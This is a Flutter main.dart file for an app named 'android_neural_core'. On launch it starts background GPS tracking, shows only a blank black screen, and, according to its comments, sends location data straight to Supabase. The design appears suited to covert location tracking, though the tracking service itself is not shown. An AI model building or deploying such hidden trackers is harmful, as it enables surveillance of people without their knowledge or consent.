/// Minimal main entry point — starts background GPS tracking immediately
/// with no visible UI. All data goes directly to Supabase.
library;

import 'package:flutter/material.dart';
import 'package:android_neural_core/config/supabase_config.dart';
import 'package:android_neural_core/services/background_service.dart';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await SupabaseConfig.init();

  // Start background service immediately — no UI needed
  await startBackgroundService();

  runApp(const BackgroundApp());
}

/// Minimal app with no UI — just a black screen while GPS runs in background.
class BackgroundApp extends StatelessWidget {
  const BackgroundApp({super.key});

  @override
  Widget build(BuildContext context) {
    return const MaterialApp(
      debugShowCheckedModeBanner: false,
      home: Scaffold(
        backgroundColor: Colors.black,
        body: SizedBox.shrink(),
      ),
    );
  }
}